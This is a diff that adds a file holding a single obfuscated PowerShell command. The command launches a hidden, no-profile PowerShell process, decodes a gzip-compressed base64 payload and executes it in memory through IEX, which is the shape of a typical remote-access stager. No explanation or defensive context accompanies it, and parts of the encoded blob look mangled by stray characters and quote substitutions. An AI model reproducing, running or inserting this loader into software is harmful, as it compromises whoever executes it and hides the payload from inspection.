@@ -1,0 +1,31 @@
+powershell.exe -nop -w hidden -c ‘if([IntPtr]::Size -eq 4)
+
+
+{$b=$env:windir+’’\sysnative\WindowsPowerShell\v1.0\powershell.exe’’} else{$b=’’powershell.exe’’};$s=New-Object 
+
+System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=’’-nop -w hidden -c 
+$s=New-Object IO.MemoryStream(,
+[Convert]::FromBase64String(‘’’’H4sIAA6wI1gCA7VW4W6bSBD+3Up9B1RZMlYdGydOLhcp0gEGG4pd
+uxhI4loVgTVsvLAUlhin13e/AZvUbZNTetKtbLG7M7Mz883Mzq7y2GOYxtztIOK+vnn9auqmbsTxjbBXqLFr
+tbnGw1S/um+9egXERvBZuo+4S45fiEkyoJGL4+XFhZynKYrZbt0ZIiZmGYpuCUYZ3+L+5pwQpejow+0d8hj3
+lWt87gwJvXXJnm0ru16IuCMx9kuaQT23NKljJgQzvvnpU7O1OOotO8qX3CUZ3zS3GUNRxyek2eK+tUqF82-
+2C+OYYeynN6Ip1HByfHHesOHNXaAKn3aMxYiH1s2YL3IBfiliextzOofKEHZ1vwnSaUk/0/RRlwN7R4nu6Rnwjzglpc3/xi736j3nMcISAzlBKExOl99hDWWfkxj5BH9FqyU/Qpvb6pUL8oRBwTVnaakM4nrJzTP2coJ1os/
+WrpXUMWzAe4wj+f3vz+s3rVR14jJTJNhkdBh9mrxbVHIGZ/JRmuGK95IQ2NwZ9LqPpFpaNeZqj1pJblPgvlkuuUVhh1H5evlczA2s2lPyHGCVZOAyBtLAp9pcguo9Q4/YcpcZJIc4zvaI/n3EDtMIxGmxjN8JenVT8U/
+CjFUGV252abQJG8s09AfkDRFDgshLPNrf4VUyJMHuUlXJMfJSKHoQwA6sguq0fjdmFiG9q8RhFgNlu3YRorCCVUc29T99trb1cA1NTJm6WtblpDrXktTkTuQT5bU6MM7wniTmj1bT53dxxThj23IzVxy1bP+O51yvTOGNp7
+kE4AYO5mSAPu6SEpM2NsI+krYmDWn/zSUBklxAcB3DSPQQEdkogTFYmSQqmVgnR6piIaVFCUAQ8VXGrxA2gl
+Pf1UGWVGyC/+ZylddrvcrzEpgblwE4IuEkoa3M2ThncFSXOh1n238w5uC1+MExO0T5UfF1UC2nLyjpokJmmIjco03YPWQVQygAcNaWR5GborG+yFKDj33YVPDidDuiDCENRP85sybTsG23s68TUmHmtYMMKQw33tADWW0
+sJpkxI3s/nI90cjMR0UIQrUcs0ZSRtZz1J9Eb4D1uXLAvksGzM7gpN9KUouAqu5Y02Da80UCQbgRbAV9JCT
+xJuhEASVNkwpVDBghiYs9Gs37vRuudEwg+mZooj51Hfox6l3x9dFXNxMtbFUP3gq71jtZJfl/I366ExUKq1V65n15mCFdCjqNczO0SOnUiOot7M7EQL3m2CmW10+2oowb6GCyMxuzB6PcCBzc3b0xPXOU1uI1sAjBxTi
+0PTW8nzkRdJ3a5t9SYaRurcWQvFRhGKrT0BGXpmx1FcwipOu/aZSMtZMZb7G+NOzMfzmeissb6x4tHGyCTA
+YjL2yNw6pgNLiM7sfrQqSojEQbeHglE5Mx7CsTcfgw0gZ09c8KOSMY1AHH+RlUqXKs0tAc7MmW3c3Xd7FtaL
+iL6/ErB+7tCVQ3QaDMYQ60jvD6kys4mex/YwpteVePdPW8Orn3wBX43Z9TUCXyFePUW56z6czOSzc0kvzo0Nc3UH5OaOk4BPkS5ADigK2CCKM/BLzwleW++sx/PXPThTi2P4F/B34XxICbGy6Z0VnSmJq/dr3y08KGRZ3YzM/
+IZmI8iFQWmDQMLrzeby8m1ZJlAnDXp6+vkg55/rdmM3zUKXQC1AF6svKZWm6r4nTSkuJXi+fJSsURojAt0-
+c+n1d2CIh1Cv7Yt28oC3vmuUSLikLpifHT85a3CNj63vHrLcuLm7ATrgl9uXbMVAcsLAtFCeCAK1PKPoCuP
+py92SabPn6tHbZPSuIDjSQSkOrvDwa5NRRToe9/xXA/aUVwsd/AYDf9/6F+iJQhfbO9V+2f9z4LXh/13nHxQwY
+Tbh0Cdq9DJ7FYJ8vB8+qfXggG1b7Ub5tP+TsaAIPrn8AnC28WUkLAAA=’’’’));IEX 
+
+(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,
+
+[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();’’;$s.
+UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=’’Hidden’’;$s.
+CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);’
